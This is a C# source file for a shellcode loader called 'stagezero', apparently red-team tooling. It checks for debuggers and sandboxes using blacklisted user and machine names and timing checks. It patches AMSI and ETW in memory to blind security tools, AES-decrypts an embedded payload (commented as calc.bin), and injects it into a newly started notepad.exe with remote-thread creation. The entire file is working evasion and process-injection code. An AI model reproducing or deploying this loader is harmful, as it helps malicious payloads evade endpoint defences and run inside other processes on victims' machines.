using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Cryptography;
using DynamicInvoke = DInvoke.DynamicInvoke;


namespace stagezero
{
    class Program
    {
        static byte[] DecryptXyz(string encB64, string keyB64, string ivB64)
        {
            byte[] enc = Convert.FromBase64String(encB64);
            byte[] key = Convert.FromBase64String(keyB64);
            byte[] iv = Convert.FromBase64String(ivB64);

            RijndaelManaged aes = new RijndaelManaged();
            aes.KeySize = 256;
            aes.BlockSize = 128;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = key;
            aes.IV = iv;

            ICryptoTransform decryptor = aes.CreateDecryptor();
            return decryptor.TransformFinalBlock(enc, 0, enc.Length);
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool pbDebuggerPresent);

        [DllImport("kernel32.dll")]
        static extern uint GetTickCount();

        // ===== SANDBOX EVASION =====
        static int NotepadChildrenCheck()
        {
            int notepadChildren = 0;
            foreach (var proc in Process.GetProcessesByName("notepad"))
            {
                if (proc.MainWindowHandle != IntPtr.Zero)
                {
                    notepadChildren++;
                }
            }
            if (notepadChildren > 2)
            {
                return 1;
            }
            return 0;
        }

        // ===== SLEEP OBFUSCATION =====
        static void SleepObfuscated(uint baseMs)
        {
            Random rand = new Random();
            uint jitter = (uint)rand.Next(0, 250);
            Sleep(baseMs + jitter);
        }

        // ===== ANTI-ANALYSIS USERNAME CHECKS =====
        static bool UsernameBlacklisted()
        {
            string user = Environment.UserName.ToLower();
            string[] blacklist = { "user", "dans", "vxxxx", "sand", "malware", "maltest", "currentuser", "sandbox", "virus", "john", "anley" };
            foreach (var u in blacklist)
            {
                if (u == user) return true;
            }
            return false;
        }

        // ===== ANTI-ANALYSIS COMPUTERNAME CHECKS =====
        static bool ComputerNameBlacklisted()
        {
            string pcName = Environment.MachineName.ToLower();
            string[] blacklist = { "hal9000", "hancitor", "rurt", "CERT", "systemIT", "comp3", "ktop", "8342", "7439-7093" };
            foreach (var name in blacklist)
            {
                if (name == pcName) return true;
            }
            return false;
        }

        // ===== AMSI RUNTIME BYPASS =====
        static void AMSIBypass()
        {
            try
            {
                var amsi = DynamicInvoke.Generic.GetLibraryAddress("amsi.dll", "AmsiScanBuffer");
                IntPtr amsiAddr = amsi;
                byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                IntPtr regionSize = (IntPtr)patch.Length;
                DynamicInvoke.Native.NtProtectVirtualMemory(Process.GetCurrentProcess().Handle, ref amsiAddr, ref regionSize, 0x40);
                Marshal.Copy(patch, 0, amsiAddr, patch.Length);
                DynamicInvoke.Native.NtProtectVirtualMemory(Process.GetCurrentProcess().Handle, ref amsiAddr, ref regionSize, 0x20);
            }
            catch { /* silent fail */ }
        }

        // ===== ETW RUNTIME BYPASS =====
        static void ETWBypass()
        {
            try
            {
                var ntdll = DynamicInvoke.Generic.GetLibraryAddress("ntdll.dll", "EtwEventWrite");
                IntPtr etwAddr = ntdll;
                byte[] patch = new byte[] { 0x33, 0xC0, 0xC3 };
                IntPtr regionSize = (IntPtr)patch.Length;
                DynamicInvoke.Native.NtProtectVirtualMemory(Process.GetCurrentProcess().Handle, ref etwAddr, ref regionSize, 0x40);
                Marshal.Copy(patch, 0, etwAddr, patch.Length);
                DynamicInvoke.Native.NtProtectVirtualMemory(Process.GetCurrentProcess().Handle, ref etwAddr, ref regionSize, 0x20);
            }
            catch { /* silent fail */ }
        }

        static void Main(string[] args)
        {
            // ===== RUNTIME EVASION CHECKS =====
            bool debuggerPresent = false;
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref debuggerPresent);
            if (debuggerPresent)
            {
                return;
            }

            if (NotepadChildrenCheck() == 1)
            {
                return;
            }

            if (UsernameBlacklisted() || ComputerNameBlacklisted())
            {
                return;
            }

            uint tick = GetTickCount();
            SleepObfuscated(500);
            if (GetTickCount() - tick < 450)
            {
                return;
            }

            // ===== BYPASS ETW + AMSI BEFORE INJECTION =====
            ETWBypass();
            AMSIBypass();

            // .\encrypt-shellcode.ps1 -ShellcodePath .\calc.bin.b64  
            string xyz = "U5iUW0X3Zz8p/nmjhf8n1pO+sJNCjXGquQ+/I3lQPgJruNz1upNRCKF6rizfHYc9RGBC/6Faa+jrhoWPsPfBjukxrpOh0cJK2XuoM1tu1Nzk8Na9zuxs84bAXOPKqfkFnRN6eHJ7WbyfYpl9x5mQ3E+JhkCMO4v8GeNL6EW0Jh9UuwIgMN1Bdkjkmar/VugaIGTP3Wk/FTwMv75Kv1y3mSgbgSSvfan+EqbvIE6XTRZ9OIjoYMIU8Odtm6dxFbQTH6qBQ0NP50r+SFwlj56IoodHBHn3idPiRcljy6rW+Usa9vhZh/sxJi3dgWsm7YWDZimUY46KxlfWcpJ+H4SkVheZSyZPCr8eYkDNAMFiPF3uX6bHC90neQaIyUMmhc0P";
            string xyzKey = "tHJ3IMm9OR/dlguysRgUqgiNFv98AAF5ZZZnyWPaDVM=";
            string xyzIV = "YDbQg20N/8lIzoALVGBg9A==";

            byte[] sc = DecryptXyz(xyz, xyzKey, xyzIV);

            // ===== LATE PROCESS BINDING =====
            SleepObfuscated(2000);

            var process = Process.Start("C:\\Windows\\System32\\notepad.exe");
            var pid = (uint)process.Id;

            IntPtr procHandle = DynamicInvoke.Native.NtOpenProcess(pid, DInvoke.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS);
            IntPtr baseAddr = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)sc.Length;
            IntPtr alloc = DynamicInvoke.Native.NtAllocateVirtualMemory(procHandle, ref baseAddr, IntPtr.Zero, ref regionSize, 0x1000 | 0x2000, 0x04);
            uint ntWVMemory = DynamicInvoke.Native.NtWriteVirtualMemory(procHandle, alloc, Marshal.UnsafeAddrOfPinnedArrayElement(sc, 0), (uint)sc.Length);
            var ntPVMemory = DynamicInvoke.Native.NtProtectVirtualMemory(procHandle, ref alloc, ref regionSize, (uint)0x20);
            var pCreateRemoteThread = DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "CreateRemoteThread");
            IntPtr threadId = IntPtr.Zero;
            var crtResult = DInvoke.DynamicInvoke.Win32.CreateRemoteThread(procHandle, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, ref threadId);
        }
    }
}